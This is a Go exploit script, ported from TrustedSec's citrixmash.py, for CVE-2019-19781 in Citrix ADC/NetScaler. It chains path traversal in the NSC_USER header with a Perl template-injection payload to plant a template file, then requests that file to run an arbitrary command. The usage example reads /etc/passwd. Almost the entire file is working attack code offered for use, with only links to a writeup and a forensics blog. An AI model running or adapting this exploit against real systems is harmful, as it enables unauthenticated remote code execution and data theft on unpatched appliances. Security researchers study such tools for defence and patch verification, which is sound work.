package main

/******************************************************************************************************************************************
* Exploit Citrix - Remote Code Execution Bug: CVE-2019-19781
* Writeup and mitigation: https://www.trustedsec.com/blog/critical-exposure-in-citrix-adc-netscaler-unauthenticated-remote-code-execution/
* Forensics and IoC Blog: https://www.trustedsec.com/blog/netscaler-remote-code-execution-forensics/
*
* This tool is ported to Golang from https://github.com/trustedsec/cve-2019-19781/blob/master/citrixmash.py.
*
* Usage: go run citrixmash.go <victimurl> <cmd>
* Example: go run citrixmash.go https://127.0.0.1/ "cat /etc/passwd"
*******************************************************************************************************************************************/

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"time"
)

const (
	letterIdxBits = 6
	letterIdxMask = 1<<letterIdxBits - 1
	letterIdxMax  = 63 / letterIdxBits
)

func main() {
	if len(os.Args) != 3 {
		fmt.Println("Usage: " + os.Args[0] + " [IPaddress] [cmd]")
		os.Exit(1)
	}
	target := os.Args[1]
	cmd := os.Args[2]
	exploit(target, cmd)
}

func exploit(target string, cmd string) {
	encoded := ""
	for i := 0; i < len(cmd); i++ {
		encoded += "chr(" + strconv.Itoa(int(byte(cmd[i]))) + ") . "
	}
	encoded = encoded[:len(encoded)-3]
	payload := "[% template.new({'BLOCK'='print readpipe(" + encoded + ")'})%]"
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	filename := randomString(7)
	nonce := randomString(2)
	client := &http.Client{Transport: tr}
	postData := []byte("url=http://example.com/&title=" + payload + "&desc=desc&UI_inuse=a")
	req, err := http.NewRequest("POST", target+"/vpn/../vpns/portal/scripts/newbm.pl", bytes.NewReader(postData))
	if err != nil {
		panic(err)
	}
	req.Header.Add("NSC_USER", "../../../../netscaler/portal/templates/"+filename)
	req.Header.Add("NSC_NONCE", nonce)
	resp, err := client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	result, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	fmt.Println("--== Result ==--")
	req, err = http.NewRequest("GET", target+"/vpn/../vpns/portal/"+filename+".xml", nil)
	if err != nil {
		panic(err)
	}
	req.Header.Add("NSC_USER", "../../../../netscaler/portal/templates/"+filename)
	req.Header.Add("NSC_NONCE", nonce)
	resp, err = client.Do(req)
	if err != nil {
		panic(err)
	}
	defer resp.Body.Close()
	result, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	fmt.Println(string(result))
}

func randomString(n int) string {
	letterRunes := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	src := rand.NewSource(time.Now().UnixNano())
	b := make([]byte, n)
	for i, cache, remain := n-1, src.Int63(), letterIdxMax; i >= 0; {
		if remain == 0 {
			cache, remain = src.Int63(), letterIdxMax
		}
		if idx := int(cache & letterIdxMask); idx < len(letterRunes) {
			b[i] = letterRunes[idx]
			i--
		}
		cache >>= letterIdxBits
		remain--
	}
	return string(b)
}
